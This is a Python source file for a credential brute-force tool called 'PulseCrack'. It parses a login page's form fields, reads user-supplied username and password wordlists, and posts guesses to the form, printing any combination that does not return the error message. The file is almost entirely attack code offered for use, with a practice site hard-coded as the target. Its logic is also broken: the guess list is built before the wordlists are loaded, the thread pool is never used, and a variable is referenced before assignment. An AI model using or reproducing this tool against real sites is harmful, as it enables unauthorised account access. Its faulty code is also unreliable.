import requests
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup
import rich 
from rich import print
import re
from time import sleep
import os

os.system('cls' if os.name == 'nt' else 'clear')
#from rich import input

print('''
      [bold magenta]
   __________        .__                  _________                          __     
\______   \ __ __ |  |    ______  ____ \_   ___ \_______ _____     ____  |  | __ 
 |     ___/|  |  \|  |   /  ___/_/ __ \/    \  \/\_  __ \\__  \  _/ ___\ |  |/ / 
 |    |    |  |  /|  |__ \___ \ \  ___/\     \____|  | \/ / __ \_\  \___ |    <  
 |____|    |____/ |____//____  > \___  >\______  /|__|   (____  / \___  >|__|_ \ 
                             \/      \/        \/             \/      \/      \/ 
  [/bold magenta]
  [yellow]PulseCrack Brute Force Attack: v1.0[/yellow]              [bold]dev: Dev Cansado: https://github.com/rafaellima-py/[/bold]
                                                                                    
''')
try:
   URL = "http://testphp.vulnweb.com/login.php"#input('Enter the website Login Page: ')
   request = requests.get(URL,timeout=2)
 
   if request.status_code == 200:
      print(f'[bold green]{URL} - Successful connection[/bold green]\n\n')
   else:
      print(f'[bold red]{URL} - Connection error[/bold red]')
      exit()
except:
   print('[bold red]Website not Found. Try: https://www.site.com[/bold red]')
   exit()   
soup = BeautifulSoup(request.text, 'html.parser')
html_form = soup.find_all('form')
#print(html_form)
html_form_action = [elements.get('action') for elements in html_form]
form_action = html_form_action[0]
input_html = soup.find_all('input')
inputs = [elements.get('name') for elements in input_html if elements.get('type') == 'text' or elements.get('type') == 'password']
html_input_user = inputs[0]
html_input_pass = inputs[1]
re_token = re.compile(r'token')
token = bool(re_token.search(form_action))
    
    
    
    
print(f'''
   ANALYSE: {URL}:
   [bold green]Html input name user:[/bold green] [bold yellow]{html_input_user} [/bold yellow]
   [bold green]Html input name pass:[/bold green] [bold yellow]{html_input_pass} [/bold yellow]
   [bold green]Form action:[/bold green] [bold yellow]{form_action} [/bold yellow]
   [bold green]Login with Token:[/bold green] [bold yellow]{token} [/bold yellow]
          
          ''')
confirm_analyse = input('Do you want use default values? [Y/N]: ').lower().strip()
if confirm_analyse == 'y':
   pass
         
else:
   html_input_user = input('Input username html identified: ')
   html_input_pass = input('Input password html identified: ')
   form_action = input('Form action: ')
   
   

wordlist_user = input('Enter directory wordlist username txt: ')
wordlist_pass = input('Enter directory wordlist password txt: ')
message_erro = input('Enter error message in html: ')
threads = int(input('Enter threads (*recommended 5): '))
timeout = int(input('Enter timeout  '))
list_user = []
list_pass = []
credencials = [(user, passw) for user in list_user for passw in list_pass]

with open(wordlist_user, 'r') as file:
    for w_user in file:
        list_user.append(w_user.strip())
with open(wordlist_pass, 'r') as file:
    for w_pass in file:
        list_pass.append(w_pass.strip())

def brute_force(credencials):
   user, password = credencials
   headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'}
   data = {html_input_user: user, html_input_pass: password}
   request = requests.post(form_action, data=data, headers=headers, timeout=1)
   if request.status_code == 200:
      print(f'[bold yellow]Testing credencials: {user}: {password}[/bold yellow]')
   else:
      print('[bold red]Connection error[/bold red]')   
   if token:
      html_form_action = [elements.get('action') for elements in html_form]
      form_action = html_form_action[0]
         
   if message_erro in request.text:
         print(f'[bold red] faill[/bold red]')
   else: 
         print(f'[bold green] Successful login: {user}:{password}[/bold green]')
         exit()
brute_force(('test', 'test'))